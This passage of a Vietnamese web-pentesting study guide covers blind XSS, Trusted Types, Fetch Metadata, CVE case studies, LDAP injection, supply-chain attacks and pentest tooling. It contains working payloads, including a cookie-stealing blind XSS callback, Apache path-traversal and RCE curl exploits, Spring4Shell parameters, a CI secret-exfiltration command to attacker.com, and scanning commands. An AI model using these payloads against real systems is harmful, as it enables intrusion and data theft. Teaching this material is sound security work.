+Ví dụ thực tế:
+- Đặt XSS payload trong User-Agent header → trigger khi admin xem access logs
+- Đặt trong support ticket → trigger khi support staff mở ticket
+- Đặt trong file metadata (EXIF, PDF title) → trigger khi system process file
+- Đặt trong error messages → trigger khi dev xem error dashboard
+
+Tại sao nguy hiểm hơn Reflected/Stored XSS thông thường?
+- Admin panels thường KHÔNG có CSP
+- Internal tools thường CÓ ÍT security hardening
+- Admin session = high privilege → impact cao hơn nhiều
+```
+
+### 40.2 Payloads & Tools
+
+```javascript
+// XSS Hunter-style payload — gửi callback với thông tin trang
+"><script src="https://YOUR_DOMAIN/probe.js"></script>
+
+// probe.js thu thập:
+// - document.cookie (admin session token!)
+// - document.URL (URL internal)
+// - document.body.innerHTML (screenshot nội dung trang)
+// - navigator.userAgent (info về browser admin)
+// - DOM screenshot via html2canvas
+
+// Self-hosted alternatives:
+// - XSS Hunter Express (self-hosted, open source)
+// - ezXSS (PHP-based)
+// - bXSS (Node.js-based)
+
+// Nơi inject Blind XSS:
+// Headers: User-Agent, Referer, X-Forwarded-For
+// Forms: contact forms, feedback, support tickets
+// File metadata: filename, EXIF data, PDF properties
+// Registration: username, display name, company name
+// Orders: shipping address, order notes
+```
+
+### 40.3 Service Worker Persistence via XSS
+
+```javascript
+// Nếu có XSS trên site → register Service Worker = PERSISTENT XSS
+// Service Worker tồn tại NGAY CẢ KHI XSS gốc bị fix!
+
+// Payload inject:
+navigator.serviceWorker.register('/sw.js');
+
+// sw.js (cần host trên same-origin hoặc inject qua file upload):
+self.addEventListener('fetch', function(event) {
+  if (event.request.url.includes('/login')) {
+    // Intercept login form, steal credentials
+    event.respondWith(
+      fetch(event.request).then(function(response) {
+        // Clone response, extract data, exfil
+        return response;
+      })
+    );
+  }
+});
+
+// Service Worker requirements:
+// - Phải được serve từ same-origin
+// - Phải qua HTTPS
+// - Scope giới hạn bởi path của SW file
+// Bypass: file upload .js lên same-origin → register as SW
+```
+
+---
+
+## Chương 41: Trusted Types — Tương Lai Phòng Chống DOM XSS
+
+### 41.1 Vấn Đề Mà Trusted Types Giải Quyết
+
+```
+Hiện tại: Bất kỳ string nào cũng có thể assign vào DOM sinks:
+  element.innerHTML = userInput;  // XSS nếu userInput chứa <script>
+  location.href = userInput;       // XSS nếu userInput = javascript:...
+  eval(userInput);                 // Code injection
+
+Trusted Types: Yêu cầu typed objects thay vì raw strings:
+  element.innerHTML = "string";    // ❌ TypeError!
+  element.innerHTML = trustedHTML; // ✅ OK (TrustedHTML object)
+
+Bật qua CSP:
+  Content-Security-Policy: require-trusted-types-for 'script';
+  Content-Security-Policy: trusted-types myPolicy;
+```
+
+### 41.2 Implementation
+
+```javascript
+// Tạo policy
+const sanitizePolicy = trustedTypes.createPolicy('sanitize', {
+  createHTML: (input) => DOMPurify.sanitize(input),
+  createScriptURL: (input) => {
+    const url = new URL(input, document.baseURI);
+    if (url.origin !== location.origin) throw new Error('blocked');
+    return url.toString();
+  },
+  createScript: (input) => { throw new Error('no eval!'); }
+});
+
+// Sử dụng
+element.innerHTML = sanitizePolicy.createHTML(userInput);  // ✅ Qua DOMPurify
+element.innerHTML = userInput;  // ❌ TypeError!
+
+// Default policy (catch-all cho legacy code)
+trustedTypes.createPolicy('default', {
+  createHTML: (input) => DOMPurify.sanitize(input),
+});
+```
+
+### 41.3 Bypass Techniques (cho pentesters)
+
+```javascript
+// 1. Tìm policy lax (createHTML trả về input không sanitize)
+trustedTypes.createPolicy('bad', { createHTML: (s) => s });
+
+// 2. Tìm default policy quá permissive
+// 3. Prototype pollution → override createPolicy
+// 4. Tìm code path không đi qua Trusted Types (non-DOM sinks)
+// 5. document.write() KHÔNG bị block bởi Trusted Types trong mọi context
+```
+
+---
+
+## Chương 42: Fetch Metadata Headers — Server-Side Defense Hiện Đại
+
+### 42.1 Fetch Metadata là gì?
+
+```
+Browser gửi thêm headers cho biết CONTEXT của request:
+
+Sec-Fetch-Site:  same-origin | same-site | cross-site | none
+Sec-Fetch-Mode:  navigate | cors | no-cors | same-origin | websocket
+Sec-Fetch-Dest:  document | script | style | image | font | ...
+Sec-Fetch-User:  ?1 (user-initiated) | absent (not user-initiated)
+
+Ví dụ:
+1. User click link trên example.com → example.com/api:
+   Sec-Fetch-Site: same-origin
+   Sec-Fetch-Mode: navigate
+   Sec-Fetch-Dest: document
+   Sec-Fetch-User: ?1
+
+2. evil.com có <img src="https://example.com/api/data">:
+   Sec-Fetch-Site: cross-site     ← CROSS-SITE!
+   Sec-Fetch-Mode: no-cors
+   Sec-Fetch-Dest: image          ← Giả vờ là image!
+
+3. evil.com form submit → example.com/api/transfer:
+   Sec-Fetch-Site: cross-site     ← CROSS-SITE!
+   Sec-Fetch-Mode: navigate
+   Sec-Fetch-Dest: document
+```
+
+### 42.2 Resource Isolation Policy (Google's approach)
+
+```python
+# Middleware chặn cross-origin requests:
+def resource_isolation_policy(request):
+    fetch_site = request.headers.get('Sec-Fetch-Site', '')
+    fetch_mode = request.headers.get('Sec-Fetch-Mode', '')
+    fetch_dest = request.headers.get('Sec-Fetch-Dest', '')
+
+    # Cho phép requests từ same-origin hoặc same-site
+    if fetch_site in ('same-origin', 'same-site', 'none', ''):
+        return True
+
+    # Cho phép top-level navigation (user click link)
+    if fetch_mode == 'navigate' and request.method == 'GET' and fetch_dest == 'document':
+        return True
+
+    # Block EVERYTHING else (cross-site requests to API, subresource loads, etc.)
+    return False  # → 403 Forbidden
+
+# Policy này CHẶN:
+# ✅ CSRF (cross-site form submission với non-GET methods)
+# ✅ XSSI (cross-site script inclusion)
+# ✅ Clickjacking probing (cross-site iframe loads)
+# ✅ Cross-origin resource theft
+#
+# Tốt hơn CSRF token vì KHÔNG CẦN token, KHÔNG CẦN cookie,
+# browser tự gửi context → server chỉ cần check headers
+```
+
+### 42.3 Tại sao quan trọng hơn CSRF tokens?
+
+```
+CSRF Token:
+  - Developer phải tạo, lưu, validate token cho MỌI form/request
+  - Dễ quên, dễ implement sai, cần sync giữa frontend/backend
+  - Có thể bị leak qua Referer, XSS, cache
+
+Fetch Metadata:
+  - Browser TỰ ĐỘNG gửi headers (không cần code phía client)
+  - Server chỉ cần 1 middleware check Sec-Fetch-Site
+  - KHÔNG THỂ forge (browser control, attacker không thể set)
+  - Chặn cả CSRF, XSSI, cross-origin resource theft cùng lúc
+
+→ Fetch Metadata là BEST PRACTICE cho defense-in-depth,
+  CÙNG VỚI (không phải thay thế) CSRF tokens.
+```
+
+---
+
+## Chương 43: Real-World CVE Case Studies
+
+### 43.1 Capital One Breach (2019) — SSRF → Cloud Metadata → Data Exfiltration
+
+```
+Attack chain:
+1. WAF misconfiguration cho phép SSRF request
+2. SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/
+3. Lấy AWS IAM temporary credentials (Access Key + Secret Key + Token)
+4. Dùng credentials để truy cập S3 buckets
+5. Exfiltrate 100 triệu records (credit card applications)
+
+Root cause: IMDSv1 (no auth needed), WAF misconfigured, over-privileged IAM role
+Hậu quả: $80 triệu fine, criminal charges
+
+Bài học:
+- Dùng IMDSv2 (requires PUT + token)
+- Least-privilege IAM roles
+- VPC endpoint policies giới hạn metadata access
+- Network segmentation
+```
+
+### 43.2 Apache Path Traversal (CVE-2021-41773, CVE-2021-42013) — 0-day in the Wild
+
+```
+Apache 2.4.49: Path normalization bypass
+
+Root cause: ap_normalize_path() mới được viết lại, KHÔNG handle
+URL-encoded dot-dot: /.%2e/ (. theo sau %2e = .)
+
+Exploit:
+  curl 'https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
+
+CVE-2021-42013: Fix cho 41773 bị bypass bằng double encoding:
+  curl 'https://target.com/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
+
+Nếu mod_cgi enabled → RCE:
+  curl -X POST 'https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' \
+    -d 'echo; id'
+
+Timeline: Patch 2.4.49 → 0-day found → Patch 2.4.50 → bypass found → Patch 2.4.51
+Bài học: Parser rewrite = regression risk, fuzzing critical paths
+```
+
+### 43.3 MOVEit Transfer SQLi (CVE-2023-34362) — Mass Exploitation
+
+```
+Attack chain:
+1. Unauthenticated SQLi trong /api/v1/ endpoint
+2. SQLi → extract API keys và session tokens
+3. Session hijack → admin access
+4. Admin access → deploy webshell (human2.aspx)
+5. Webshell → data exfiltration
+
+Cl0p ransomware group exploited this, affecting 2,500+ organizations:
+  BBC, British Airways, Shell, US Department of Energy, ...
+
+Root cause: IDataService.cs sử dụng string concatenation thay vì parameterized queries
+Impact: Hàng trăm triệu records bị lộ
+```
+
+### 43.4 HTTP/2 Rapid Reset (CVE-2023-44487) — Largest DDoS Ever
+
+```
+HTTP/2 cho phép client mở stream rồi RST_STREAM ngay lập tức.
+Server vẫn phải allocate resources để process stream trước khi nhận RST.
+
+Attack: Gửi hàng triệu HEADERS + RST_STREAM pairs mỗi giây.
+Server overwhelmed vì mỗi stream tốn CPU/memory dù bị cancel ngay.
+
+Scale: 398 triệu requests/second (lớn nhất lịch sử, tính đến 2023)
+Affected: mọi HTTP/2 implementation (Nginx, Apache, Go net/http, ...)
+
+Mitigation: Rate limit RST_STREAM per connection, limit concurrent streams
+```
+
+### 43.5 Spring4Shell (CVE-2022-22965) — Java ClassLoader Manipulation
+
+```
+Spring Framework RCE via data binding:
+  Condition: Spring MVC + JDK 9+ + Tomcat + WAR deployment
+  
+Attack: POST with special parameter names that traverse Java ClassLoader:
+  class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{...}
+  class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+  class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+  class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+  class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+→ Modify Tomcat AccessLogValve → write JSP webshell
+
+Root cause: JDK 9+ exposed Module class via getClass().getModule().getClassLoader()
+  bypassing the previous fix for CVE-2010-1622 (Spring ClassLoader manipulation)
+
+Bài học: "Fixed" vulnerabilities can come back when platform changes
+```
+
+---
+
+## Chương 44: LDAP Injection — Lỗ Hổng Enterprise Bị Bỏ Quên
+
+### 44.1 Khái niệm
+
+```
+LDAP (Lightweight Directory Access Protocol) = protocol truy cập directory services.
+Phổ biến trong: Active Directory, OpenLDAP, enterprise authentication.
+
+Web apps dùng LDAP cho:
+- Authentication (login bằng corporate credentials)
+- User/group lookup (tìm user trong organization)
+- Address book queries
+
+LDAP filter syntax:
+  (attribute=value)           Simple
+  (&(attr1=val1)(attr2=val2)) AND
+  (|(attr1=val1)(attr2=val2)) OR
+  (!(attr=val))               NOT
+  (attr=val*)                 Wildcard
+
+LDAP Injection: tương tự SQLi nhưng dùng LDAP filter syntax
+```
+
+### 44.2 Exploitation
+
+```
+=== Authentication Bypass ===
+Original query: (&(user=INPUT)(password=INPUT))
+
+Inject user: admin)(&)
+Result: (&(user=admin)(&))(password=anything))
+→ (&(user=admin)(&)) luôn TRUE → bypass password!
+
+Inject user: *)(|(&
+Result: (&(user=*)(|(&))(password=anything))
+→ user=* match mọi user
+
+=== Data Exfiltration ===
+Input: admin)(|(password=a*) → nếu TRUE → password bắt đầu bằng "a"
+Input: admin)(|(password=b*) → nếu FALSE → thử ký tự khác
+→ Boolean-based blind LDAP injection, giống blind SQLi!
+
+=== Wildcard Enumeration ===
+Search: (cn=*admin*)  → liệt kê tất cả admin accounts
+Search: (mail=*@company.com) → liệt kê tất cả email accounts
+
+=== Special Characters ===
+LDAP metacharacters cần escape: * ( ) \ NUL
+Escaped form: \2a \28 \29 \5c \00
+```
+
+---
+
+## Chương 45: Modern Browser Security — COOP, COEP, CORP
+
+### 45.1 Cross-Origin Isolation
+
+```
+Sau Spectre/Meltdown, browsers cần cách ly memory giữa origins.
+SharedArrayBuffer (high-resolution timer) bị disable trừ khi page
+declare cross-origin isolation:
+
+Cross-Origin-Opener-Policy (COOP):
+  same-origin → browsing context group chỉ chứa same-origin documents
+  same-origin-allow-popups → cho phép popups nhưng vẫn isolated
+  unsafe-none → mặc định, không isolation
+
+Cross-Origin-Embedder-Policy (COEP):
+  require-corp → tất cả cross-origin resources phải opt-in (CORS hoặc CORP header)
+  credentialless → cross-origin no-cors requests gửi không credentials
+  unsafe-none → mặc định
+
+Cross-Origin-Resource-Policy (CORP):
+  same-origin → chỉ same-origin load được
+  same-site → same-site load được
+  cross-origin → ai cũng load được
+
+Khi COOP: same-origin + COEP: require-corp:
+  → self.crossOriginIsolated = true
+  → SharedArrayBuffer available
+  → performance.measureUserAgentSpecificMemory() available
+  → process isolation enforced (Spectre mitigation)
+```
+
+### 45.2 CORB/ORB (Cross-Origin Read Blocking)
+
+```
+Ngay cả khi SOP cho phép cross-origin LOAD (img, script tags),
+CORB/ORB CHẶN cross-origin READ của certain content types:
+
+Browser detect: Response looks like HTML/JSON/XML + loaded as script/image?
+  → BLOCK! Response body = empty.
+
+Ví dụ:
+  <script src="https://api.target.com/user/data.json"></script>
+  → Browser load, nhưng CORB detect JSON content-type
+  → Response body stripped → script error (attacker không đọc được data)
+
+ORB (Opaque Response Blocking) là evolution của CORB:
+  - Stricter rules
+  - Applies to more content types
+  - Chrome, Firefox đang implement
+
+Bypass attempts:
+  - Serve sensitive data as text/javascript → CORB/ORB allow
+  - JSONP endpoints bypass CORB → phải disable JSONP!
+```
+
+---
+
+## Chương 46: Supply Chain Security & CI/CD Attacks
+
+### 46.1 Dependency Confusion
+
+```
+Attack: Đăng ký package public với tên TRÙNG internal private package.
+Build system prioritize public registry → download attacker's package → RCE
+
+Ví dụ (Alex Birsan, 2021):
+  Apple, Microsoft, PayPal internal packages exposed via package.json
+  Attacker publish higher version number trên npm/PyPI
+  Install scripts chạy trên build servers → exfil data
+
+Prevention:
+  - npm: .npmrc với registry=https://private-registry.company.com/
+  - pip: --index-url vs --extra-index-url (extra-index-url thêm, KHÔNG thay thế)
+  - Lock files: package-lock.json, yarn.lock, Pipfile.lock
+  - Verify checksums: npm audit, pip-audit, Snyk
+```
+
+### 46.2 CI/CD Pipeline Attacks
+
+```
+Attack vectors:
+1. Poisoned pull request → CI runs attacker's code
+   - GitHub Actions: pull_request_target + checkout PR code = RCE
+   - Branch protection bypass → direct push to main
+
+2. Secret exfiltration from CI environment
+   - env | curl -X POST -d @- https://attacker.com/
+   - CI secrets in environment variables → any step can read
+
+3. Artifact poisoning
+   - Replace legitimate build artifacts
+   - Docker image tag overwrite
+
+4. Dependency update PRs
+   - Renovate/Dependabot PR → reviewer doesn't read changelog → malicious version merged
+
+Defense:
+  - SLSA framework (Supply-chain Levels for Software Artifacts)
+  - Sigstore/cosign for signing artifacts
+  - Hermetic builds (no network access during build)
+  - Separate build and deploy permissions
+  - Review ALL dependency updates
+```
+
+---
+
+## Chương 47: Tool Arsenal — Công Cụ Pentester Thực Tế
+
+### 47.1 Reconnaissance
+
+```bash
+# Subdomain enumeration
+subfinder -d target.com -all -o subdomains.txt
+amass enum -d target.com -active -o amass.txt
+# Certificate transparency
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# DNS brute force
+puredns bruteforce wordlist.txt target.com -r resolvers.txt
+
+# Port scanning
+nmap -sS -p- --min-rate 10000 target.com
+rustscan -a target.com -t 5000
+```
+
+### 47.2 Content Discovery
+
+```bash
+# Directory/file brute force
+ffuf -w wordlist.txt -u https://target.com/FUZZ -mc all -fc 404
+feroxbuster -u https://target.com -w wordlist.txt --depth 3
+
+# Parameter discovery
+arjun -u https://target.com/api -m GET
+paramspider -d target.com
+
+# JavaScript analysis (find endpoints, secrets)
+cat target.js | linkfinder -i - -o cli
+cat target.js | secretfinder -i - -o cli
+
+# Google dorking
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com ext:sql | ext:bak | ext:log
+inurl:".env" "DB_PASSWORD"
+```
+
+### 47.3 Vulnerability Scanning
+
+```bash
+# Nuclei (template-based scanner)
+nuclei -u https://target.com -t cves/ -t vulnerabilities/ -severity critical,high
+nuclei -l urls.txt -t http/technologies/ -silent
+
+# Nikto (web server scanner)
+nikto -h https://target.com
+
+# SQLMap (SQL injection)
+sqlmap -u "https://target.com/page?id=1" --batch --risk=3 --level=5
+
+# XSS detection
+dalfox url "https://target.com/page?q=test" -b YOUR_BLIND_XSS_HOST
+```
+
+### 47.4 Modern Proxy Alternatives
+
+```
+Caido (https://caido.io)
+  - Modern alternative cho Burp Suite
+  - Rust-based → nhanh hơn Burp
+  - Plugin system bằng JavaScript
+  - Free tier mạnh hơn Burp Community
+
+mitmproxy
+  - Scripted proxy bằng Python
+  - Ideal cho automation:
+    mitmproxy -s modify_request.py
+  - CLI mode (mitmdump) cho headless testing
+
+Browser DevTools
+  - Network tab: xem requests/responses, filter, replay
+  - Console: test JavaScript payloads, inspect DOM
+  - Sources: đọc JavaScript, đặt breakpoints
+  - Application: xem cookies, localStorage, Service Workers
+  - Security tab: certificate info, mixed content
+  - Performance: timing attacks, resource loading order
+```
+
+---
+
+## H. Bảng Tham Chiếu CVE Quan Trọng
+
+```
+╔═════════════════════╦═══════════════════════╦══════════════════════════════════╗
+║ CVE                 ║ Vulnerability Type    ║ Impact & Bài Học               ║
+╠═════════════════════╬═══════════════════════╬══════════════════════════════════╣
+║ CVE-2021-44228      ║ Log4Shell (JNDI)      ║ RCE trên hàng triệu servers    ║
+║ CVE-2023-34362      ║ MOVEit SQLi           ║ 2500+ orgs compromised         ║
+║ CVE-2022-22965      ║ Spring4Shell          ║ Java ClassLoader → RCE         ║
+║ CVE-2021-41773      ║ Apache Path Traversal ║ Path normalization bypass      ║
+║ CVE-2023-44487      ║ HTTP/2 Rapid Reset    ║ Largest DDoS ever (398M rps)   ║
+║ CVE-2019-11510      ║ Pulse Secure LFI      ║ VPN credential theft           ║
+║ CVE-2020-5902       ║ F5 BIG-IP RCE         ║ TMUI path traversal → RCE     ║
+║ CVE-2023-24329      ║ Python urllib bypass   ║ URL parser scheme bypass       ║
+║ CVE-2020-0688       ║ Exchange ViewState    ║ Hardcoded machineKey → RCE     ║
+║ CVE-2019-9193       ║ PostgreSQL COPY       ║ SQL → OS command execution     ║
+║ CVE-2017-5638       ║ Struts2 OGNL          ║ Content-Type → RCE            ║
+║ CVE-2023-22527      ║ Confluence OGNL       ║ Template injection → RCE      ║
+║ CVE-2014-6271       ║ Shellshock            ║ Bash function export → RCE    ║
+║ CVE-2016-3714       ║ ImageTragick          ║ ImageMagick → RCE             ║
+║ CVE-2018-1002200    ║ Zip Slip              ║ Archive extraction traversal   ║
+║ CVE-2015-9235       ║ JWT alg=none          ║ JWT signature bypass           ║
+║ CVE-2016-10555      ║ Auth0 JWT confusion   ║ RS256→HS256 algorithm switch   ║
+║ CVE-2022-22963      ║ Spring Cloud SpEL     ║ Expression Language → RCE     ║
+║ CVE-2019-14234      ║ Django JSONField SQLi ║ ORM-specific injection         ║
+║ CVE-2021-40346      ║ HAProxy smuggling     ║ Integer overflow in CL parsing ║
+╚═════════════════════╩═══════════════════════╩══════════════════════════════════╝
+```
+
+---
+
+## I. OWASP API Security Top 10 (2023) — Quick Reference
+
+```
+API1:2023 — Broken Object Level Authorization (BOLA)
+  = IDOR cho APIs. GET /api/users/123 → đổi thành /api/users/456
+  Root cause: thiếu authorization check per-object
+
+API2:2023 — Broken Authentication
+  = Weak auth mechanisms cho APIs (no rate limit, weak tokens)
+
+API3:2023 — Broken Object Property Level Authorization
+  = Mass Assignment + Excessive Data Exposure
+  POST {"name":"user","role":"admin"} ← không filter trusted fields
+
+API4:2023 — Unrestricted Resource Consumption
+  = No rate limiting, no pagination limits, no file size limits
+  GET /api/search?q=*&page_size=1000000
+
+API5:2023 — Broken Function Level Authorization (BFLA)
+  = Vertical privilege escalation trong API endpoints
+  User gọi PUT /api/admin/config → server không check role
+
+API6:2023 — Unrestricted Access to Sensitive Business Flows
+  = API abuse (bot buying, scraping, spam)
+
+API7:2023 — Server-Side Request Forgery (SSRF)
+  = API endpoint fetch URL do user control
+
+API8:2023 — Security Misconfiguration
+  = Debug mode on, CORS *, verbose errors, default creds
+
+API9:2023 — Improper Inventory Management
+  = Old API versions still accessible, undocumented endpoints
+
+API10:2023 — Unsafe Consumption of APIs
+  = Trusting 3rd-party API responses without validation
+```
+
+---
+
+# KẾT THÚC QUYỂN 7: MỞ RỘNG NGOÀI PORTSWIGGER
 # Chúc bạn hành trình học tập và nghiên cứu thành công!
